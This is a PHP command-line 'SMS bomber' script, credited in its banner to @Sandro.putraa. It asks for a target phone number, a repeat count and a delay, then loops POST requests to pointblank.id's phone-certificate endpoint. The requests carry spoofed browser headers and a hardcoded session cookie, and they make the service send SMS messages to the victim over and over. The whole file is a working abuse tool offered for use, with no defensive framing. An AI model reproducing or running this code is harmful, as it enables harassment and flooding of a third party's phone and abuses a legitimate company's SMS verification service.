<?php
function pb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
               $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.pointblank.id/phone/cert/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.pointblank.id/phone/change/input');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $headers = array();
$headers[] = 'Host: www.pointblank.id';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Length: 18';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://www.pointblank.id';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8';
$headers[] = 'Cookie: _ga=GA1.2.910695634.1556334293; SESSION=OWQyZGMwNWMtNDI4Mi00NTdlLWJiNTktYjUzZjM0YzkxNTYx; _gid=GA1.2.335144060.1558154413; _gat_gtag_UA_129579613_1=1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."<br>";
        sleep($wait);
        $x++;
        flush();
        
    }
}
system("clear");
echo"\n\e[93m 
   _____                 _           
  / ____|               | |          
 | (___   __ _ _ __   __| |_ __ ___  
  \___ \ / _` | '_ \ / _` | '__/ _ \ 
  ____) | (_| | | | | (_| | | | (_) |
 |_____/ \__,_|_| |_|\__,_|_|  \___/
              _         
             | |    
  _ __  _   _| |_ _ __ __ _  __ _ 
 | '_ \| | | | __| '__/ _` |/ _` |
 | |_) | |_| | |_| | | (_| | (_| |
 | .__/ \__,_|\__|_|  \__,_|\__,_|
 | |                              
 |_|                               
\e";
echo "\n\e[93m
\e[36m===========\e[91m>>>>>>>>>>\n\e[36
mBOM SMS PB ZEPPETO
Reedit By : @Sandro.putraa
\e[36m===========\e[91m>>>>>>>>>>";
echo "\n\e[93m
\e[75mCara Penggunaan\e[91m>>>>>>>>\n\e[91
minput no target (08.........)";
echo "\n\e[36mTarget  : ";
$no = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jum = trim(fgets(STDIN));
echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
$wait = trim(fgets(STDIN));
$execute = pb($no, $jum, $wait);
print $execute;
print "DONE ALL SEND\n";
?>
